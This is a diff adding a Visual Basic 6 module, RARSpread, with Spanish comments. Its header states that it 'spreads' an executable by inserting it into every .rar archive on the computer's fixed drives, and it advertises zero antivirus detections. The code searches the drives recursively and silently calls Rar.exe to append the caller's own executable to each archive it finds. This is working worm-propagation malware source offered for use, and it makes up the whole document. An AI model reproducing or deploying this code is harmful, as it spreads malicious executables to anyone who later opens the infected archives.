@@ -1,0 +1,88 @@
+'---------------------------------------------------------------------------------------------------------------------------------------------------------------
+'Función: RARSpread
+'Autor: chequinho
+'Creditos: xtremevbtalk.com [FindFiles]
+'Finalidad: Agregar o "spradear" un archivo en todos los archivos .rar ubicados en los discos locales
+'Fecha: 27/06/2013
+'Detecciones: 0/35 (P-Code)
+'Uso: RARSpread(sFilePath)
+    'sFilePAth: El directorio hacia el ejecutable a distribuir
+'Ejemplo:
+    'Call RARSpread(App.Path & "\" & App.EXEName & ".exe")
+'Notas
+    '- Se puede configurar si se quiere buscar archivos .rar recursivamente o solo en la raiz de la unidad mediante un booleano (bRecursive)
+    '- Se requiere agregar referencia hacia Windows Script Host Objecto Model en el menú Proyecto > Referencias
+'---------------------------------------------------------------------------------------------------------------------------------------------------------------
+ 
+Public Sub RARSpread(sFilePath As String)
+    If FileExist(Environ("ProgramFiles") & "\WinRAR\WinRAR.exe") Then
+        Dim sFiles() As String
+        Dim Finded As String
+        Dim sHDD() As String
+        Dim i As Long, j As Long
+        sHDD = Split(DetectHardDrives, "<->")
+        For i = LBound(sHDD) To UBound(sHDD) - 1
+            Finded = FindFilesByExtension(sHDD(i), ".rar", True)
+            sFiles = Split(Finded, ",")
+            For j = 0 To UBound(sFiles)
+                If sFiles(j) <> vbNullString Then
+                    Shell (Environ("ProgramFiles") & "\WinRAR\Rar.exe" & " a -tk -y -ep1 " & sFiles(j) & " " & sFilePath)
+                End If
+            Next j
+        Next i
+    End If
+End Sub
+ 
+Private Function FindFilesByExtension(ByVal sPath As String, sExtension As String, bRecursive As Boolean) As String
+    On Error Resume Next
+    Dim subPath() As String
+    Dim nDir As Integer
+    Dim i As Integer
+    Dim sFiles As String
+    Dim currentFile As String
+    If Right$(sPath, 1) <> "\" Then sPath = sPath & "\"
+    currentFile = Dir$(sPath & "*.*", vbDirectory)
+    While Len(currentFile)
+        If (currentFile <> "..") And (currentFile <> ".") Then
+            If GetAttr(sPath & currentFile) And vbDirectory Then
+                ReDim Preserve subPath(nDir)
+                subPath(nDir) = currentFile
+                nDir = nDir + 1
+            Else
+                If "." & Mid$(Mid$(currentFile, InStrRev(currentFile, "\") + 1), InStrRev(Mid$(currentFile, InStrRev(currentFile, "\") + 1), ".") + 1) = sExtension Then
+                    sFiles = sFiles & "," & sPath & currentFile
+                End If
+            End If
+        End If
+        currentFile = Dir$
+    Wend
+    If bRecursive = True Then
+        For i = 0 To nDir - 1
+            sFiles = sFiles & "," & FindFilesByExtension(sPath & subPath(i) & "\", sExtension, bRecursive)
+        Next i
+    End If
+    FindFilesByExtension = Mid$(sFiles, 2)
+    Erase subPath
+End Function
+ 
+Private Function DetectHardDrives() As String
+    Dim objDrive As Object
+    DetectHardDrives = ""
+    Const FIXED_DRIVE = 2
+    For Each objDrive In CreateObject("Scripting.FileSystemObject").Drives
+        If objDrive.IsReady Then
+            If objDrive.DriveType = FIXED_DRIVE And objDrive.Path <> "A:" Then
+                DetectHardDrives = DetectHardDrives & objDrive.Path & "\" & "<->"
+            End If
+        End If
+    Next
+End Function
+ 
+Public Function FileExist(FileName As String) As Boolean
+    On Error GoTo ErrorHandler
+    Call FileLen(FileName)
+    FileExist = True
+    Exit Function
+ErrorHandler:
+    FileExist = False
+End Function
